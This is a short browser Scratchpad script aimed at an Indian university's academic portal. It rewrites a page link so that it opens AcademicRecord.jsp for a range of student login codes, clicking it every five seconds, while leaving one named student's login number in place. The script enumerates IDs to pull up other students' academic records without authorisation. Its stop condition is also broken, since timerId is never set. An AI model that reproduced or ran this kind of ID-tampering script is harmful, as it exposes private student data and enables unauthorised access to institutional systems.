/*
 * This is a JavaScript Scratchpad.
 *
 * Enter some JavaScript, then Right Click or choose from the Execute Menu:
 * 1. Run to evaluate the selected text (Ctrl+R),
 * 2. Inspect to bring up an Object Inspector on the result (Ctrl+I), or,
 * 3. Display to insert the result in a comment after the selection. (Ctrl+L)
 */
var d = document.getElementsByClassName("flat")[26]
var i = 50001
function getPage(){
        d.href="http://asc.iitb.ac.in/academic/utility/AcademicRecord.jsp?loginCode=1200"
        +i+"&loginnumber=120050047&loginName=Rakesh%20Ranjan%20Nayak";
        d.target="_blank";
        d.click();
        i++;
        if(i == 50089)
            {
                clearInterval(timerId);
            }
}
setInterval(function(){getPage()},5000);